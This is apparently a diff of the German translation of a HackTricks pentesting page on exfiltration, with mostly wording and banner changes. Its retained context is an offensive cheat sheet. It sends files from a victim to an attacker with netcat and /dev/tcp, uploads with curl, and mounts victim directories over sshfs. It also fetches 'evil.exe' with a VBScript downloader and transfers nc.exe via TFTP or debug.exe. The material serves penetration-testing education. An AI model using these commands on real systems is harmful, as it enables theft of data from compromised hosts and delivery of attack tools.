@@ -1,33 +1,25 @@
 # Exfiltration
 
 {% hint style="success" %}
-Lernen Sie & üben Sie AWS-Hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Lernen Sie & üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Unterstützen Sie HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
+## Häufig whitelisted Domains zum Exfiltrieren von Informationen
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+Check [https://lots-project.com/](https://lots-project.com/) um häufig whitelisted Domains zu finden, die missbraucht werden können
 
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
-## Häufig whitelistete Domains zum Exfiltrieren von Informationen
-
-Überprüfen Sie [https://lots-project.com/](https://lots-project.com/), um häufig whitelistete Domains zu finden, die missbraucht werden können
-
-## Kopieren & Einfügen Base64
+## Copy\&Paste Base64
 
 **Linux**
 ```bash
@@ -66,7 +58,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Dateien hochladen
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* [**SimpleHttpServer druckt GET und POSTs (auch Header)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Python-Modul [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -80,7 +72,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPS Server**
+### **HTTPS-Server**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -171,7 +163,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Oder erstellen Sie einen SMB-Share **mit Samba**:
+Oder erstellen Sie einen smb-Share **mit Samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -187,21 +179,6 @@ guest ok = Yes
 service smbd restart
 ```
 Windows
-
----
-
-### Exfiltration
-
-Exfiltration is the unauthorized transfer of data from a target. There are various methods to exfiltrate data from a compromised system. Some common exfiltration methods include:
-
-- **Email**: Sending data as email attachments to an external email account.
-- **FTP**: Transferring data using the File Transfer Protocol to an external server.
-- **DNS**: Encoding data within DNS requests to leak information.
-- **HTTP/HTTPS**: Sending data over HTTP or HTTPS to a remote server.
-- **Steganography**: Hiding data within other files to avoid detection.
-- **Cloud Storage**: Uploading data to cloud storage services.
-
-Attackers may use one or more of these methods to exfiltrate sensitive information from a target network. It is essential for defenders to monitor and control outbound network traffic to detect and prevent exfiltration attempts.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -217,13 +194,13 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Wenn das Opfer SSH hat, kann der Angreifer ein Verzeichnis vom Opfer zum Angreifer mounten.
+Wenn das Opfer SSH hat, kann der Angreifer ein Verzeichnis vom Opfer zum Angreifer einbinden.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-## Netzwerk-Kommunikation
+## NC
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -235,14 +212,14 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Datei auf das Opfer hochladen
+### Datei an das Opfer hochladen
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-Dank an **@BinaryShadow\_**
+danke an **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -270,9 +247,9 @@ sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Standardmäßig in XP und 2003 (bei anderen muss es während der Installation explizit hinzugefügt werden)
+Standardmäßig in XP und 2003 (in anderen muss es während der Installation ausdrücklich hinzugefügt werden)
 
-In Kali **starten Sie den TFTP-Server**:
+In Kali, **TFTP-Server starten**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
@@ -290,15 +267,11 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Laden Sie eine Datei mit einem PHP-Oneliner herunter:
+Lade eine Datei mit einem PHP-Oneliner herunter:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 ## VBScript
-
-### Exfiltration
-
-VBScript can be used to exfiltrate data by sending it over HTTP or HTTPS to an attacker-controlled server. This can be achieved by creating an HTTP request object, setting the request method, headers, and body, and then sending the request to the server. The server-side script should be able to receive the incoming data and log/process it as needed. This method can be used to exfiltrate sensitive information such as passwords, documents, or system configuration details.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -336,14 +309,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Das Programm `debug.exe` ermöglicht nicht nur die Inspektion von Binärdateien, sondern hat auch die **Fähigkeit, sie aus Hexadezimalwerten neu zu erstellen**. Das bedeutet, dass `debug.exe`, indem es einen Hexadezimalwert einer Binärdatei bereitstellt, die Binärdatei generieren kann. Es ist jedoch wichtig zu beachten, dass debug.exe eine **Einschränkung beim Zusammenstellen von Dateien bis zu 64 KB Größe** hat.
+Das `debug.exe` Programm ermöglicht nicht nur die Inspektion von Binaries, sondern hat auch die **Fähigkeit, sie aus Hex zu rekonstruieren**. Das bedeutet, dass `debug.exe` die Binärdatei generieren kann, indem man ein Hex eines Binaries bereitstellt. Es ist jedoch wichtig zu beachten, dass debug.exe eine **Einschränkung hat, Dateien bis zu 64 kb Größe zusammenzustellen**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-```markdown
-Dann kopieren Sie den Text in die Windows-Shell, und eine Datei namens nc.exe wird erstellt.
+Dann fügen Sie den Text in die Windows-Shell ein, und eine Datei namens nc.exe wird erstellt.
 
 * [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
@@ -351,24 +323,17 @@ Dann kopieren Sie den Text in die Windows-Shell, und eine Datei namens nc.exe wi
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
 {% hint style="success" %}
-Lernen Sie & üben Sie AWS-Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Lernen Sie & üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Unterstützen Sie HackTricks</summary>
 
 * Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
-```
